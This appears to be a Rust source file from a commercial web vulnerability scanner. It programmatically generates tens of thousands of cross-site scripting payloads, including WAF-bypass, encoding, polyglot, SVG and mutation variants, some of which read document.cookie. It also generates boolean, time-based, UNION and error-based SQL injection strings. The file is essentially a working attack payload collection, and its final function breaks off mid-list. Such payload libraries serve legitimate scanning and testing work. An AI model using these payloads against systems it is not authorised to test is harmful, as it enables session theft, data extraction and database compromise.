// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - ULTRA Payload Database for Rust Scanner
 * 100,000+ Security Testing Payloads
 *
 * Ported from JavaScript payload generators with full feature parity
 *
 * @copyright 2026 Bountyy Oy - www.bountyy.fi
 * @license Proprietary - Enterprise Edition
 */

/// Generate massive script-based XSS payload variations (20,000+)
pub fn generate_script_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    let functions = vec![
        "alert",
        "prompt",
        "confirm",
        "console.log",
        "eval",
        "setTimeout",
        "setInterval",
        "Function",
        "XMLHttpRequest",
        "fetch",
        "import",
        "document.write",
        "document.writeln",
        "localStorage.setItem",
        "sessionStorage.setItem",
        "navigator.sendBeacon",
        "postMessage",
        "open",
        "print",
        "focus",
        "blur",
        "scroll",
        "scrollTo",
        "scrollBy",
        "requestAnimationFrame",
        "setImmediate",
        "clearTimeout",
        "clearInterval",
        "addEventListener",
        "dispatchEvent",
        "execCommand",
    ];

    let args = vec![
        "1",
        "document.domain",
        "document.cookie",
        "localStorage",
        "sessionStorage",
        "window.origin",
        "location.href",
        "navigator.userAgent",
        "window.name",
        "String.fromCharCode(88,83,83)",
        "/XSS/",
        "atob(\"WFNT\")",
        "btoa(\"XSS\")",
        "encodeURI(\"XSS\")",
    ];

    // Generate 20,000+ script variations
    for func in &functions {
        for arg in &args {
            payloads.push(format!("<script>{}({})</script>", func, arg));
            payloads.push(format!("<script> {}({}) </script>", func, arg));
            payloads.push(format!("<script>\n{}({})\n</script>", func, arg));
            payloads.push(format!("<script>/**/{}({})/**/</script>", func, arg));
            payloads.push(format!("<SCRIPT>{}({})</SCRIPT>", func, arg));
            payloads.push(format!("<ScRiPt>{}({})</sCrIpT>", func, arg));
            payloads.push(format!("<script>{}({})", func, arg));
            payloads.push(format!(
                "<script type=\"text/javascript\">{}({})</script>",
                func, arg
            ));
            payloads.push(format!("<script src=x>{}({})</script>", func, arg));
            payloads.push(format!("<script>var a=1;{}({})</script>", func, arg));
            payloads.push(format!("<script>{}`{}`</script>", func, arg));
            payloads.push(format!("<script>top.{}({})</script>", func, arg));
            payloads.push(format!("<script>parent.{}({})</script>", func, arg));
            payloads.push(format!("<script>self.{}({})</script>", func, arg));
            payloads.push(format!("<script>window[\"{}\"]({}) </script>", func, arg));
        }
    }

    payloads
}

/// Generate event-based XSS payload variations (40,000+)
pub fn generate_event_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    let events = vec![
        "onload",
        "onerror",
        "onclick",
        "onmouseover",
        "onmouseout",
        "onmouseenter",
        "onmouseleave",
        "onmousedown",
        "onmouseup",
        "onfocus",
        "onblur",
        "onchange",
        "oninput",
        "onsubmit",
        "onreset",
        "onselect",
        "onkeydown",
        "onkeyup",
        "onkeypress",
        "onabort",
        "oncanplay",
        "oncanplaythrough",
        "ondurationchange",
        "onemptied",
        "onended",
        "onloadeddata",
        "onloadedmetadata",
        "onloadstart",
        "onpause",
        "onplay",
        "onplaying",
        "onprogress",
        "onratechange",
        "onseeked",
        "onseeking",
        "onstalled",
        "onsuspend",
        "ontimeupdate",
        "onvolumechange",
        "onwaiting",
        "ondrag",
        "ondragend",
        "ondragenter",
        "ondragleave",
        "ondragover",
        "ondragstart",
        "ondrop",
        "onscroll",
        "oncopy",
        "oncut",
        "onpaste",
        "onwheel",
        "ontouchstart",
        "ontouchend",
        "ontouchmove",
        "onanimationstart",
        "onanimationend",
        "onanimationiteration",
        "ontransitionend",
        "onhashchange",
        "onmessage",
        "onoffline",
        "ononline",
        "onpopstate",
        "onresize",
        "onstorage",
        "onunload",
        "onbeforeunload",
        "onpageshow",
        "onpagehide",
        "oncontextmenu",
        "ondblclick",
        "onshow",
        "ontoggle",
        "oninvalid",
        "onsearch",
        "onpointerover",
        "onpointerenter",
        "onpointerdown",
        "onpointermove",
        "onpointerup",
        "onpointercancel",
        "onpointerout",
        "onpointerleave",
        "ongotpointercapture",
        "onlostpointercapture",
        "onfullscreenchange",
        "onfullscreenerror",
        "onpointerlockchange",
        "onpointerlockerror",
        "onreadystatechange",
        "onvisibilitychange",
        "onafterprint",
        "onbeforeprint",
        "onselectstart",
        "onselectionchange",
    ];

    let tags = vec![
        "img", "svg", "body", "input", "details", "video", "audio", "iframe", "object", "embed",
        "form", "button", "select", "textarea", "div", "span", "a", "area", "base", "marquee",
        "table", "td", "th", "tr",
    ];

    let functions = vec![
        "alert",
        "prompt",
        "confirm",
        "eval",
        "console.log",
        "document.write",
    ];

    // Generate 40,000+ event-based variations
    for tag in &tags {
        for event in &events {
            for func in &functions {
                payloads.push(format!("<{} {}={}(1)>", tag, event, func));
                payloads.push(format!("<{} {}=\"{}(1)\">", tag, event, func));
                payloads.push(format!("<{} {}='{}(1)'>", tag, event, func));
                payloads.push(format!("<{} {}={}\\`1\\`>", tag, event, func));

                if vec!["img", "video", "audio", "iframe", "embed"].contains(tag) {
                    payloads.push(format!("<{} src=x {}={}(1)>", tag, event, func));
                    payloads.push(format!("<{} src=x {}=\"{}(1)\">", tag, event, func));
                }

                payloads.push(format!(
                    "<{} {}={}(1)>",
                    tag.to_uppercase(),
                    event.to_uppercase(),
                    func
                ));
                payloads.push(format!("<{}/{}={}(1)>", tag, event, func));
                payloads.push(format!("<{} {}={}(document.cookie)>", tag, event, func));
                payloads.push(format!("<{} {}={}(document.domain)>", tag, event, func));
            }
        }
    }

    payloads
}

/// Generate encoding bypass XSS variations (20,000+)
pub fn generate_encoding_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    let base = "script";
    let chars: Vec<char> = base.chars().collect();

    // Generate encoding variations for each character
    for i in 0..chars.len() {
        let char_code = chars[i] as u32;
        let before = &base[0..i];
        let after = &base[i + 1..];

        // HTML decimal entity
        payloads.push(format!(
            "<{}&#{};{}>alert(1)</{}>",
            before, char_code, after, base
        ));
        // HTML hex entity
        payloads.push(format!(
            "<{}&#x{:x};{}>alert(1)</{}>",
            before, char_code, after, base
        ));
        // URL encoding
        payloads.push(format!(
            "<{}%{:x}{}>alert(1)</{}>",
            before, char_code, after, base
        ));
        // Unicode
        payloads.push(format!(
            "<{}\\u00{:x}{}>alert(1)</{}>",
            before, char_code, after, base
        ));
        // Hex
        payloads.push(format!(
            "<{}\\x{:x}{}>alert(1)</{}>",
            before, char_code, after, base
        ));
    }

    // Full encoding variations
    payloads.extend(vec![
        "&lt;script&gt;alert(1)&lt;/script&gt;".to_string(),
        "&#60;script&#62;alert(1)&#60;/script&#62;".to_string(),
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;".to_string(),
        "%3Cscript%3Ealert(1)%3C/script%3E".to_string(),
        "%3cscript%3ealert(1)%3c/script%3e".to_string(),
        "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E".to_string(),
        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e".to_string(),
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e".to_string(),
        "%3Cscr&#105;pt%3Ealert(1)%3C/scr&#105;pt%3E".to_string(),
        "&lt;scr&#x69;pt&gt;alert(1)&lt;/scr&#x69;pt&gt;".to_string(),
    ]);

    // Generate more combinations
    let functions = vec!["alert", "prompt", "confirm", "eval"];
    for func in &functions {
        let func_chars: Vec<char> = func.chars().collect();
        for i in 0..func_chars.len() {
            let char_code = func_chars[i] as u32;
            let before = &func[0..i];
            let after = &func[i + 1..];

            payloads.push(format!(
                "<script>{}&#{};{}(1)</script>",
                before, char_code, after
            ));
            payloads.push(format!(
                "<script>{}&#x{:x};{}(1)</script>",
                before, char_code, after
            ));
            payloads.push(format!(
                "<script>{}\\x{:x}{}(1)</script>",
                before, char_code, after
            ));
            payloads.push(format!(
                "<script>{}\\u00{:x}{}(1)</script>",
                before, char_code, after
            ));
        }
    }

    payloads
}

/// Generate WAF bypass XSS variations (10,000+)
pub fn generate_waf_bypass() -> Vec<String> {
    let mut payloads = Vec::new();

    // Null byte variations
    let null_bytes = vec!["%00", "\\x00", "\\0", "\u{0000}"];
    for nb in &null_bytes {
        payloads.push(format!("<script>alert(1){}</script>", nb));
        payloads.push(format!("<script{}>alert(1)</script>", nb));
        payloads.push(format!("<scr{}ipt>alert(1)</script>", nb));
    }

    // Comment variations
    let comments = vec!["<!-->", "/**/", "//", "<!--", "-->"];
    for comment in &comments {
        payloads.push(format!("<scr{}ipt>alert(1)</script>", comment));
        payloads.push(format!("<script>{}alert(1)</script>", comment));
        payloads.push(format!("<script>alert{}(1)</script>", comment));
    }

    // Whitespace variations
    let whitespace = vec![" ", "\t", "\n", "\r", "\u{000C}", "\u{000B}"];
    for ws in &whitespace {
        payloads.push(format!("<script{}>alert(1)</script>", ws));
        payloads.push(format!("<script>alert{}(1)</script>", ws));
        payloads.push(format!("<{}script>alert(1)</script>", ws));
    }

    // Case variations
    payloads.extend(vec![
        "<script>alert(1)</script>".to_string(),
        "<SCRIPT>alert(1)</SCRIPT>".to_string(),
        "<ScRiPt>alert(1)</sCrIpT>".to_string(),
        "<script>ALERT(1)</script>".to_string(),
        "<script>Alert(1)</script>".to_string(),
        "<script>aLeRt(1)</script>".to_string(),
    ]);

    // Attribute breaking
    payloads.extend(vec![
        "\"><script>alert(1)</script>".to_string(),
        "'><script>alert(1)</script>".to_string(),
        "><script>alert(1)</script>".to_string(),
        "</script><script>alert(1)</script>".to_string(),
        "</title><script>alert(1)</script>".to_string(),
        "</textarea><script>alert(1)</script>".to_string(),
        "</style><script>alert(1)</script>".to_string(),
        "</noscript><script>alert(1)</script>".to_string(),
    ]);

    // Tag breaking
    let contexts = vec![
        "title", "textarea", "style", "noscript", "template", "iframe", "noframes",
    ];
    for ctx in &contexts {
        payloads.push(format!("</{ctx}><script>alert(1)</script>"));
        payloads.push(format!("</{ctx}><img src=x onerror=alert(1)>"));
        payloads.push(format!("</{ctx}><svg onload=alert(1)>"));
    }

    payloads
}

/// Generate protocol handler XSS variations (5,000+)
pub fn generate_protocol_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    let protocols = vec![
        "javascript:",
        "data:text/html,",
        "data:text/html;base64,",
        "data:text/javascript,",
        "vbscript:",
        "mhtml:",
        "file:",
    ];

    let tags = vec![
        "a", "area", "base", "embed", "form", "iframe", "img", "link", "object",
    ];

    for proto in &protocols {
        for tag in &tags {
            payloads.push(format!("<{} href=\"{}alert(1)\">", tag, proto));
            payloads.push(format!("<{} src=\"{}alert(1)\">", tag, proto));
            payloads.push(format!("<{} data=\"{}alert(1)\">", tag, proto));
            payloads.push(format!("<{} action=\"{}alert(1)\">", tag, proto));

            // With encoding
            let encoded_proto = proto.replace(':', "&#58;");
            payloads.push(format!("<{} href=\"{}alert(1)\">", tag, encoded_proto));
            let url_encoded_proto = proto.replace(':', "%3a");
            payloads.push(format!("<{} href=\"{}alert(1)\">", tag, url_encoded_proto));
        }
    }

    payloads
}

/// Generate DOM-based XSS variations (5,000+)
pub fn generate_dom_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    let dom_sources = vec![
        "location",
        "location.href",
        "location.hash",
        "location.search",
        "location.pathname",
        "document.URL",
        "document.documentURI",
        "document.referrer",
        "window.name",
        "document.cookie",
    ];

    let dom_sinks = vec![
        "eval",
        "setTimeout",
        "setInterval",
        "Function",
        "execScript",
        "document.write",
        "document.writeln",
        "innerHTML",
        "outerHTML",
    ];

    for source in &dom_sources {
        for sink in &dom_sinks {
            payloads.push(format!("<script>{}({})</script>", sink, source));
            payloads.push(format!("<script>document.{}={}</script>", sink, source));
            payloads.push(format!("<script>var x={};{}(x)</script>", source, sink));
        }
    }

    payloads
}

/// Generate boolean-based blind SQLi payloads (20,000+)
pub fn generate_boolean_sqli_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    let operators = vec!["OR", "AND", "||", "&&", "XOR"];
    let true_conditions = vec![
        "1=1",
        "2=2",
        "1",
        "'1'='1'",
        "\"1\"=\"1\"",
        "1+1=2",
        "2-1=1",
        "2*2=4",
        "'a'='a'",
        "\"a\"=\"a\"",
        "true",
        "TRUE",
        "0<1",
        "1>0",
    ];

    let prefixes = vec!["'", "\"", "", ")", "))", ")))", "'))", "')))"];
    let postfixes = vec!["--", "-- ", "#", "; --", "/* */", "/**/", ";%00"];

    // Generate boolean-based variations
    for prefix in &prefixes {
        for op in &operators {
            for cond in &true_conditions {
                for postfix in &postfixes {
                    payloads.push(format!("{} {} {} {}", prefix, op, cond, postfix));
                    payloads.push(format!("{} {}{}{}", prefix, op, cond, postfix));
                    payloads.push(format!("{}{} {}{}", prefix, op, cond, postfix));
                    payloads.push(format!(
                        "{} {} {} {}",
                        prefix,
                        op.to_lowercase(),
                        cond,
                        postfix
                    ));
                }
            }
        }
    }

    // Additional boolean variations
    payloads.extend(vec![
        "' OR '1'='1".to_string(),
        "' OR 1=1--".to_string(),
        "\" OR \"1\"=\"1".to_string(),
        "\" OR 1=1--".to_string(),
        "' OR 'a'='a".to_string(),
        "' OR '1'='1'--".to_string(),
        "' OR '1'='1'#".to_string(),
        "' OR '1'='1'/*".to_string(),
        "admin'--".to_string(),
        "admin'#".to_string(),
        "admin'/*".to_string(),
        "admin' OR '1'='1".to_string(),
        "admin' OR '1'='1'--".to_string(),
        "admin' OR 1=1--".to_string(),
        "') OR ('1'='1".to_string(),
        "') OR '1'='1'--".to_string(),
        "') OR ('1'='1'--".to_string(),
        "') OR 1=1--".to_string(),
        "1' OR '1'='1".to_string(),
        "1' OR 1=1--".to_string(),
    ]);

    payloads
}

/// Generate time-based blind SQLi payloads (20,000+)
pub fn generate_time_based_sqli_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    let delays = vec![1, 3, 5, 10, 15];
    let prefixes = vec!["'", "\"", "", ")", "))", ")))", "'))", "')))"];
    let postfixes = vec!["--", "-- ", "#", ";--", "/**/"];

    // MySQL time-based
    for prefix in &prefixes {
        for delay in &delays {
            for postfix in &postfixes {
                payloads.push(format!("{} AND SLEEP({}){}", prefix, delay, postfix));
                payloads.push(format!("{} AND SLEEP({}) {}", prefix, delay, postfix));
                payloads.push(format!("{} OR SLEEP({}){}", prefix, delay, postfix));
                payloads.push(format!(
                    "{} AND (SELECT * FROM (SELECT(SLEEP({})))a){}",
                    prefix, delay, postfix
                ));
                payloads.push(format!(
                    "{} AND BENCHMARK(10000000,MD5('A')){}",
                    prefix, postfix
                ));
                payloads.push(format!(
                    "{}'; WAITFOR DELAY '0:0:{}'{}",
                    prefix, delay, postfix
                ));
                payloads.push(format!(
                    "{}; WAITFOR DELAY '0:0:{}'{}",
                    prefix, delay, postfix
                ));
            }
        }
    }

    // PostgreSQL time-based
    for prefix in &prefixes {
        for delay in &delays {
            for postfix in &postfixes {
                payloads.push(format!("{} AND pg_sleep({}){}", prefix, delay, postfix));
                payloads.push(format!("{} OR pg_sleep({}){}", prefix, delay, postfix));
                payloads.push(format!(
                    "{}'; SELECT pg_sleep({}){}",
                    prefix, delay, postfix
                ));
            }
        }
    }

    // Oracle time-based
    for prefix in &prefixes {
        for delay in &delays {
            for postfix in &postfixes {
                payloads.push(format!(
                    "{} AND DBMS_LOCK.SLEEP({}){}",
                    prefix, delay, postfix
                ));
                payloads.push(format!(
                    "{} OR DBMS_LOCK.SLEEP({}){}",
                    prefix, delay, postfix
                ));
            }
        }
    }

    payloads
}

/// Generate UNION-based SQLi payloads (15,000+)
pub fn generate_union_sqli_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    let prefixes = vec!["'", "\"", "", ")", "))", ")))", "'))", "')))"];
    let postfixes = vec!["--", "-- ", "#", ";--", "/**/"];

    // Test different column counts
    for prefix in &prefixes {
        for postfix in &postfixes {
            for num_cols in 1..=20 {
                let nulls = vec!["NULL"; num_cols].join(",");
                payloads.push(format!("{} UNION SELECT {}{}", prefix, nulls, postfix));
                payloads.push(format!("{} UNION ALL SELECT {}{}", prefix, nulls, postfix));

                // Try with numbers instead of NULL
                let numbers: Vec<String> = (1..=num_cols).map(|n| n.to_string()).collect();
                payloads.push(format!(
                    "{} UNION SELECT {}{}",
                    prefix,
                    numbers.join(","),
                    postfix
                ));
            }
        }
    }

    payloads
}

/// Generate error-based SQLi payloads (10,000+)
pub fn generate_error_based_sqli_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    let prefixes = vec!["'", "\"", "", ")", "))"];
    let postfixes = vec!["--", "#", "/**/"];

    for prefix in &prefixes {
        for postfix in &postfixes {
            // MySQL error-based
            payloads.push(format!(
                "{} AND extractvalue(1,concat(0x7e,version())){}",
                prefix, postfix
            ));
            payloads.push(format!(
                "{} AND updatexml(1,concat(0x7e,version()),1){}",
                prefix, postfix
            ));
            payloads.push(format!("{} AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)y){}", prefix, postfix));

            // SQL Server error-based
            payloads.push(format!(
                "{} AND 1=CONVERT(int,@@version){}",
                prefix, postfix
            ));
            payloads.push(format!(
                "{} AND 1=CAST((SELECT @@version) AS INT){}",
                prefix, postfix
            ));

            // PostgreSQL error-based
            payloads.push(format!(
                "{} AND 1=CAST(version() AS INT){}",
                prefix, postfix
            ));

            // Oracle error-based
            payloads.push(format!(
                "{} AND 1=UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance)){}",
                prefix, postfix
            ));
        }
    }

    payloads
}

/// Generate modern XSS polyglot payloads (100+)
/// Polyglots work in multiple contexts simultaneously
pub fn generate_polyglot_xss() -> Vec<String> {
    vec![
        // Classic Gareth Heyes polyglot
        r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#.to_string(),

        // Compact polyglot
        r#"'>"><img src=x onerror=alert()>"#.to_string(),
        r#"'><script>alert()</script>"#.to_string(),
        r#""><script>alert(String.fromCharCode(88,83,83))</script>"#.to_string(),

        // Multi-context polyglot
        r#"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"#.to_string(),

        // Mutation XSS resistant polyglot
        r#"<svg/onload=alert()>"#.to_string(),
        r#"<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">"#.to_string(),

        // HTML/JS/CSS polyglot
        r#"<style>*{background:url('javascript:alert()')}</style>"#.to_string(),
        r#"<img src='x' onerror='alert()' /><style>*{x:expression(alert())}</style>"#.to_string(),

        // Tag-breaking polyglot
        r#"</title></style></textarea></script><script>alert()</script>"#.to_string(),
        r#"</title><script>alert()</script><style>x{</style>"#.to_string(),

        // Attribute-breaking polyglot
        r#"' autofocus onfocus=alert() x='"#.to_string(),
        r#"" autofocus onfocus=alert() x=""#.to_string(),
    ]
}

/// Generate SVG-based XSS vectors (200+)
/// SVG provides many unique XSS opportunities
pub fn generate_svg_xss() -> Vec<String> {
    let mut payloads = Vec::new();

    // Basic SVG onload
    payloads.extend(vec![
        "<svg onload=alert(1)>".to_string(),
        "<svg/onload=alert(1)>".to_string(),
        "<svg onload=alert(1)//".to_string(),
        "<svg onload='alert(1)'>".to_string(),
        "<svg onload=\"alert(1)\">".to_string(),
        "<svg><script>alert(1)</script></svg>".to_string(),
        "<svg><script>alert&#40;1&#41;</script></svg>".to_string(),
        "<svg><script href=data:,alert(1) />".to_string(),
    ]);

    // SVG with animateTransform
    payloads.extend(vec![
        r#"<svg><animatetransform onbegin=alert(1)></svg>"#.to_string(),
        r#"<svg><animate onbegin=alert(1) attributeName=x dur=1s>"#.to_string(),
        r#"<svg><set onbegin=alert(1) attributeName=x to=0>"#.to_string(),
    ]);

    // SVG with foreignObject
    payloads.extend(vec![
        r#"<svg><foreignObject><body onload=alert(1)></foreignObject></svg>"#.to_string(),
        r#"<svg><foreignObject width="100" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe></foreignObject></svg>"#.to_string(),
    ]);

    // SVG with use element
    payloads.extend(vec![
        r#"<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' ><image href='1' onerror='alert(1)' /></svg>#x" /></svg>"#.to_string(),
    ]);

    // SVG with image tag
    payloads.extend(vec![
        r#"<svg><image href=x onerror=alert(1)></svg>"#.to_string(),
        r#"<svg><image xlink:href=x onerror=alert(1)></svg>"#.to_string(),
    ]);

    // SVG with textPath
    payloads.extend(vec![
        r#"<svg><text><textPath href="data:image/svg+xml,<svg><script>alert(1)</script></svg>#x">XSS</textPath></text></svg>"#.to_string(),
    ]);

    // SVG with style
    payloads.extend(vec![
        r#"<svg><style>*{background:url("javascript:alert(1)")}</style></svg>"#.to_string(),
        r#"<svg><style>@import'data:,*{x:expression(alert(1))}';</style></svg>"#.to_string(),
    ]);

    // SVG with title/desc
    payloads.extend(vec![
        "<svg><title><script>alert(1)</script></title></svg>".to_string(),
        "<svg><desc><script>alert(1)</script></desc></svg>".to_string(),
    ]);

    // SVG with event handlers
    let svg_events = vec![
        "onload",
        "onerror",
        "onactivate",
        "onfocusin",
        "onfocusout",
        "onbegin",
        "onend",
        "onrepeat",
    ];
    let svg_tags = vec![
        "svg",
        "animate",
        "animateMotion",
        "animateTransform",
        "set",
        "image",
        "use",
    ];

    for event in &svg_events {
        for tag in &svg_tags {
            payloads.push(format!("<{}  {}=alert(1)>", tag, event));
            payloads.push(format!("<{}/{}=alert(1)>", tag, event));
            payloads.push(format!("<{} {}='alert(1)'>", tag, event));
            payloads.push(format!("<{} {}=\"alert(1)\">", tag, event));
        }
    }

    // SVG with data URIs
    payloads.extend(vec![
        r#"<svg><image href="data:image/svg+xml,<svg onload=alert(1)>"></svg>"#.to_string(),
        r#"<svg><script href="data:,alert(1)"></svg>"#.to_string(),
    ]);

    payloads
}

/// Generate mutation XSS (mXSS) payloads (100+)
/// These exploit browser parsing differences and DOM mutations
pub fn generate_mutation_xss() -> Vec<String> {
    vec![
        // Backtick attribute breaking (mXSS)
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">".to_string(),
        "<noscript><style></noscript><img src=x onerror=alert(1)>".to_string(),

        // SVG mXSS
        "<svg><style><img src=x onerror=alert(1)></style></svg>".to_string(),
        "<svg><style><!--</style><img src=x onerror=alert(1)>-->".to_string(),

        // Math element mXSS
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">".to_string(),

        // Form element mXSS
        "<form><button formaction=javascript:alert(1)>XSS</button>".to_string(),
        "<form><input type=submit formaction=javascript:alert(1)>".to_string(),

        // Template element mXSS
        "<template><img src=x onerror=alert(1)></template>".to_string(),

        // XMP element mXSS
        "<xmp><script>alert(1)</script></xmp>".to_string(),

        // Textarea mXSS
        "<textarea><script>alert(1)</script></textarea>".to_string(),

        // Title mXSS
        "<title><script>alert(1)</script></title>".to_string(),

        // Style mXSS
        "<style><img src=x onerror=alert(1)></style>".to_string(),

        // Comment mXSS
        "<!--<img src=x onerror=alert(1)>-->".to_string(),
        "<!--><img src=x onerror=alert(1)>-->".to_string(),

        // Namespace confusion
        "<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>".to_string(),

        // XML namespace mXSS
        "<div xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></div>".to_string(),
    ]
}

/// Generate context-aware XSS payloads (300+)
/// Specific payloads for different injection contexts
pub fn generate_context_aware_xss() -> Vec<String> {
    let mut payloads = Vec::new();

    // HTML attribute context (unquoted)
    payloads.extend(vec![
        "x autofocus onfocus=alert(1) x".to_string(),
        "x onclick=alert(1) x".to_string(),
        "x onmouseover=alert(1) x".to_string(),
        "x onload=alert(1) x".to_string(),
    ]);

    // HTML attribute context (single-quoted)
    payloads.extend(vec![
        "' autofocus onfocus=alert(1) x='".to_string(),
        "' onclick=alert(1) '".to_string(),
        "' onmouseover=alert(1) '".to_string(),
        "' onload=alert(1) '".to_string(),
    ]);

    // HTML attribute context (double-quoted)
    payloads.extend(vec![
        "\" autofocus onfocus=alert(1) x=\"".to_string(),
        "\" onclick=alert(1) \"".to_string(),
        "\" onmouseover=alert(1) \"".to_string(),
        "\" onload=alert(1) \"".to_string(),
    ]);

    // JavaScript string context (single-quoted)
    payloads.extend(vec![
        "';alert(1);//".to_string(),
        "';alert(1);var x='".to_string(),
        "\\';alert(1);//".to_string(),
    ]);

    // JavaScript string context (double-quoted)
    payloads.extend(vec![
        "\";alert(1);//".to_string(),
        "\";alert(1);var x=\"".to_string(),
        "\\\";alert(1);//".to_string(),
    ]);

    // JavaScript string context (template literal)
    payloads.extend(vec![
        "${alert(1)}".to_string(),
        "`+alert(1)+`".to_string(),
        "${alert`1`}".to_string(),
    ]);

    // Script tag context
    payloads.extend(vec![
        "</script><script>alert(1)</script>".to_string(),
        "</script><img src=x onerror=alert(1)>".to_string(),
        "</script><svg onload=alert(1)>".to_string(),
    ]);

    // Event handler context
    payloads.extend(vec![
        "alert(1)".to_string(),
        "javascript:alert(1)".to_string(),
        "alert(document.domain)".to_string(),
        "alert(document.cookie)".to_string(),
    ]);

    // Style context
    payloads.extend(vec![
        "</style><script>alert(1)</script>".to_string(),
        "*/</style><script>alert(1)</script><style>/*".to_string(),
        "expression(alert(1))".to_string(),
        "url(javascript:alert(1))".to_string(),
    ]);

    // Comment context
    payloads.extend(vec![
        "--><script>alert(1)</script><!--".to_string(),
        "*/</script><script>alert(1)</script>/*".to_string(),
        "//--></script><script>alert(1)</script><!--//".to_string(),
    ]);

    // URL parameter context
    payloads.extend(vec![
        "javascript:alert(1)".to_string(),
        "data:text/html,<script>alert(1)</script>".to_string(),
        "vbscript:alert(1)".to_string(),
    ]);

    payloads
}

/// Generate modern WAF bypass XSS (200+)
/// Advanced techniques to bypass modern WAFs
pub fn generate_modern_waf_bypass_xss() -> Vec<String> {
    let mut payloads = Vec::new();

    // Unicode normalization bypass
    payloads.extend(vec![
        "<\u{FF1C}script\u{FF1E}alert(1)</script>".to_string(),
        "<ſcript>alert(1)</script>".to_string(), // Long s (U+017F)
    ]);

    // HTML5 entities bypass
    payloads.extend(vec![
        "<img src=x onerror=alert&lpar;1&rpar;>".to_string(),
        "<img src=x onerror=alert&NewLine;(1)>".to_string(),
        "<img src=x onerror=\u{00A0}alert(1)>".to_string(), // Non-breaking space
    ]);

    // Mixed encoding bypass
    payloads.extend(vec![
        "<img src=x on&#101;rror=alert(1)>".to_string(),
        "<img src=x on&#x65;rror=alert(1)>".to_string(),
        "<img src=x o&#110;error=alert(1)>".to_string(),
    ]);

    // Case variation bypass
    payloads.extend(vec![
        "<ScRiPt>alert(1)</sCrIpT>".to_string(),
        "<sCrIpT>alert(1)</ScRiPt>".to_string(),
        "<IMG SRC=x ONERROR=alert(1)>".to_string(),
    ]);

    // Whitespace bypass
    payloads.extend(vec![
        "<img\u{0009}src=x\u{0009}onerror=alert(1)>".to_string(), // Tab
        "<img\u{000A}src=x\u{000A}onerror=alert(1)>".to_string(), // LF
        "<img\u{000D}src=x\u{000D}onerror=alert(1)>".to_string(), // CR
        "<img\u{000C}src=x\u{000C}onerror=alert(1)>".to_string(), // FF
    ]);

    // Nested encoding bypass
    payloads.extend(vec![
        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
        "%2527%253E%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
    ]);

    // Length limits bypass
    payloads.extend(vec![
        "<svg/onload=alert(1)>".to_string(),
        "<svg/onload=alert`1`>".to_string(),
        "<script>alert`1`</script>".to_string(),
    ]);

    // Quote-less attribute bypass
    payloads.extend(vec![
        "<img src=x onerror=alert(1)>".to_string(),
        "<img src=x onerror=alert`1`>".to_string(),
        "<img src onerror=alert(1)>".to_string(),
    ]);

    // Comment obfuscation
    payloads.extend(vec![
        "<script><!--//--><!--`<!-->alert(1)</script>".to_string(),
        "<script><!--//--><![CDATA[//><!--//]]>alert(1)</script>".to_string(),
    ]);

    // Zero-width characters
    payloads.extend(vec![
        format!("<img src=x onerror=alert\u{200B}(1)>"), // Zero-width space
        format!("<img src=x onerror=alert\u{200C}(1)>"), // Zero-width non-joiner
    ]);

    payloads
}

/// Generate advanced encoding bypass XSS payloads (50+)
/// Covers hex, octal, Unicode, UTF-7, overlong UTF-8, and mixed encodings for WAF bypass
pub fn generate_advanced_encoding_bypass_xss() -> Vec<String> {
    let mut payloads = Vec::new();

    // ===========================================
    // 1. HEX ENCODING (\xNN format in JavaScript)
    // ===========================================

    // \x61\x6c\x65\x72\x74 = "alert"
    payloads.extend(vec![
        // Basic hex-encoded alert
        r#"<script>\x61\x6c\x65\x72\x74(1)</script>"#.to_string(),
        r#"<script>\x61\x6c\x65\x72\x74(document.domain)</script>"#.to_string(),
        r#"<script>\x61\x6c\x65\x72\x74(document.cookie)</script>"#.to_string(),

        // Hex in event handlers
        r#"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
        r#"<svg onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
        r#"<body onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),

        // Hex-encoded tags and attributes
        r#"<\x73\x63\x72\x69\x70\x74>alert(1)</script>"#.to_string(), // <script>
